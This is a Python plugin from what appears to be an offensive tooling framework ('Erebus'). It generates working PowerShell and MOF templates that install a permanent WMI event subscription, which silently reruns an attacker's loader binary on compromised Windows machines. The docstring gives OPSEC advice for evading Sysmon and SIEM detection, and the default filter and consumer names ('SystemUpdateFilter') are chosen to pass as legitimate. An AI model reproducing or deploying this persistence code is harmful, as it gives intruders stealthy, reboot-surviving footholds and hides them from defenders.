"""
WMI Event Subscription persistence plugin (T1546.003).

Produces a PowerShell script and a MOF file that install a permanent WMI event
subscription triggering the loader binary on a schedule.

WMI subscription components:
  __EventFilter        - defines when to trigger (time-based or system event)
  CommandLineEventConsumer - what to run when the filter fires
  __FilterToConsumerBinding - links filter to consumer

Two delivery modes:
  ps1  - PowerShell script (operator runs once; requires admin or DCOM rights)
  mof  - MOF file compiled via mofcomp.exe (admin required)

OPSEC notes:
  - WMI subscriptions survive reboots without any registry or scheduled task entry.
  - ActiveScriptEventConsumer (.vbs payload) is noisier than CommandLineEventConsumer.
  - Sysmon Event ID 20/21 logs WMI consumer creation; most SIEM rules alert on
    CommandLineEventConsumer or ActiveScriptEventConsumer with unusual binaries.
  - MOF compilation via mofcomp.exe is visible as a process creation event.
  - Prefer longer trigger intervals (every 30-60 min) over 60-second checks to
    reduce telemetry volume.
  - Cleanup: remove subscription with Remove-WmiObject or mofcomp.exe /N.
"""

import os
from ..plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


_plugin = ErebusPlugin(
    metadata=PluginMetadata(
        name="WMI Subscription Persistence",
        description="Produces PS1/MOF artifacts for WMI event subscription persistence (T1546.003)",
        author="erebus",
        version="1.0.0",
        category=PluginCategory.OTHER,
        supported_os=["Windows"],
    )
)


_PS1_TEMPLATE = """\
# WMI Event Subscription Persistence - T1546.003
# Filter fires every {interval_sec}s; consumer runs the loader.
# Run once with admin rights to install. Persists across reboots.

$filterName   = "{filter_name}"
$consumerName = "{consumer_name}"
$loaderCmd    = "{loader_cmd}"

# Remove existing subscription if present (idempotent install)
Get-WMIObject -Namespace root\\subscription -Class __EventFilter |
    Where-Object {{ $_.Name -eq $filterName }} | Remove-WmiObject
Get-WMIObject -Namespace root\\subscription -Class CommandLineEventConsumer |
    Where-Object {{ $_.Name -eq $consumerName }} | Remove-WmiObject
Get-WMIObject -Namespace root\\subscription -Class __FilterToConsumerBinding |
    Where-Object {{ $_.Filter -like "*$filterName*" }} | Remove-WmiObject

# Create the timer-based event filter.
$filterQuery = "SELECT * FROM __InstanceModificationEvent WITHIN {interval_sec} " +
               "WHERE TargetInstance ISA 'Win32_LocalTime' AND " +
               "TargetInstance.Seconds = 0"

$filter = Set-WmiInstance -Namespace root\\subscription `
    -Class __EventFilter `
    -Arguments @{{
        Name           = $filterName
        EventNamespace = "root\\cimv2"
        QueryLanguage  = "WQL"
        Query          = $filterQuery
    }}

# Create the command-line consumer.
$consumer = Set-WmiInstance -Namespace root\\subscription `
    -Class CommandLineEventConsumer `
    -Arguments @{{
        Name                = $consumerName
        CommandLineTemplate = $loaderCmd
        RunInteractively    = $false
    }}

# Bind filter to consumer.
Set-WmiInstance -Namespace root\\subscription `
    -Class __FilterToConsumerBinding `
    -Arguments @{{
        Filter   = $filter
        Consumer = $consumer
    }} | Out-Null

Write-Output "[+] WMI persistence installed: $filterName -> $consumerName"
Write-Output "[+] Trigger: every {interval_sec}s (on the minute)"
Write-Output "[+] Consumer: $loaderCmd"
"""

_PS1_CLEANUP_TEMPLATE = """\
# Remove WMI persistence subscription
$filterName   = "{filter_name}"
$consumerName = "{consumer_name}"

Get-WMIObject -Namespace root\\subscription -Class __EventFilter |
    Where-Object {{ $_.Name -eq $filterName }} | Remove-WmiObject
Get-WMIObject -Namespace root\\subscription -Class CommandLineEventConsumer |
    Where-Object {{ $_.Name -eq $consumerName }} | Remove-WmiObject
Get-WMIObject -Namespace root\\subscription -Class __FilterToConsumerBinding |
    Where-Object {{ $_.Filter -like "*$filterName*" }} | Remove-WmiObject

Write-Output "[-] WMI persistence removed"
"""

_MOF_TEMPLATE = """\
// WMI Event Subscription Persistence - T1546.003
// Compile with: mofcomp.exe persist_wmi.mof

#pragma namespace("\\\\\\\\.\\\\\\\\ root\\\\subscription")
#pragma autorecover

instance of __EventFilter as $filter
{{
    Name           = "{filter_name}";
    EventNamespace = "root\\\\cimv2";
    QueryLanguage  = "WQL";
    Query          = "SELECT * FROM __InstanceModificationEvent WITHIN {interval_sec} "
                     "WHERE TargetInstance ISA \\'Win32_LocalTime\\' AND "
                     "TargetInstance.Seconds = 0";
}};

instance of CommandLineEventConsumer as $consumer
{{
    Name                = "{consumer_name}";
    CommandLineTemplate = "{loader_cmd_escaped}";
    RunInteractively    = FALSE;
}};

instance of __FilterToConsumerBinding
{{
    Filter   = $filter;
    Consumer = $consumer;
}};
"""


def create_wmi_subscription(payload_path: str, output_dir: str, **kwargs) -> dict:
    """
    Generate WMI persistence artifacts.

    Args:
        payload_path: Full command line to invoke the loader binary on the target.
        output_dir:   Directory where output files are written.
        **kwargs:
            filter_name (str):   WMI filter name. Default: "SystemUpdateFilter".
            consumer_name (str): WMI consumer name. Default: "SystemUpdateConsumer".
            interval_sec (int):  Trigger interval in seconds. Default: 1800 (30 min).

    Returns:
        dict with keys:
            ps1_path     - path to the install .ps1
            cleanup_path - path to the cleanup .ps1
            mof_path     - path to the .mof file
            filter_name  - WMI filter name used
            consumer_name - WMI consumer name used
            mofcomp_cmd  - mofcomp.exe invocation string
    """
    os.makedirs(output_dir, exist_ok=True)

    filter_name: str  = str(kwargs.get("filter_name",   "SystemUpdateFilter"))
    consumer_name: str = str(kwargs.get("consumer_name", "SystemUpdateConsumer"))
    interval_sec: int  = int(kwargs.get("interval_sec",  1800))

    ps1_path = os.path.join(output_dir, "persist_wmi.ps1")
    ps1_content = _PS1_TEMPLATE.format(
        filter_name=filter_name,
        consumer_name=consumer_name,
        loader_cmd=payload_path,
        interval_sec=interval_sec,
    )
    with open(ps1_path, "w", encoding="utf-8") as fh:
        fh.write(ps1_content)

    cleanup_path = os.path.join(output_dir, "persist_wmi_cleanup.ps1")
    with open(cleanup_path, "w", encoding="utf-8") as fh:
        fh.write(_PS1_CLEANUP_TEMPLATE.format(
            filter_name=filter_name,
            consumer_name=consumer_name,
        ))

    mof_path = os.path.join(output_dir, "persist_wmi.mof")
    # MOF strings use \\ escaping internally
    loader_cmd_escaped = payload_path.replace("\\", "\\\\").replace('"', '\\"')
    mof_content = _MOF_TEMPLATE.format(
        filter_name=filter_name,
        consumer_name=consumer_name,
        loader_cmd_escaped=loader_cmd_escaped,
        interval_sec=interval_sec,
    )
    with open(mof_path, "w", encoding="utf-8") as fh:
        fh.write(mof_content)

    return {
        "ps1_path": ps1_path,
        "cleanup_path": cleanup_path,
        "mof_path": mof_path,
        "filter_name": filter_name,
        "consumer_name": consumer_name,
        "mofcomp_cmd": "mofcomp.exe persist_wmi.mof",
    }


def register():
    _plugin.register_function("create_wmi_subscription", create_wmi_subscription)
    return _plugin


def on_load():
    return register()
